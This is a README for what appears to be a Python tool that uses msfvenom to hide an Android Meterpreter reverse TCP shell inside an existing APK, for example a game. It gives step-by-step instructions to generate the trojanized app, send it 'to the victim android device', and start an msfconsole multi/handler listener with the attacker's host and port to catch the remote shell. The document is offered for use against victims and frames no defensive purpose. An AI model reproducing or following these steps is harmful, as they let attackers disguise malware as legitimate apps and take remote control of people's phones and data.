## Android apk and payload combiner
# A small python script that uses msfvenom to hide a tcp reverse shell to an android device inside an APK file

Hide an msfconsole reverse tcp shell payload in an existing apk application, made by bkstephen    ver July 2020
        
    
# Requirements:
  1. msfvenom: for generating the payload
  2. msfconsole (Metasploit): for starting the meterpreter session
  3. An apk file to place the payload in, e.g. an android game (search for Flappy Bird android apk)
  4. Make sure you have zipalign installed (apt install zipalign)
  
  
**Step 1: Run the script (preferably as root): sudo python3 android_payload_generator.py**

**Step 2: Once the payload is generated, send it to the victim android device to run it.**

**Step 3: Make sure you have initialized an msfconsole session using the following commands:**

	                  msfconsole
                      use exploit/multi/handler
	                  set payload android/meterpreter/reverse_tcp
	                  set LHOST {same ip as the one used for the script}
	                  set LPORT {same port as the one used for the script}
	                  exploit
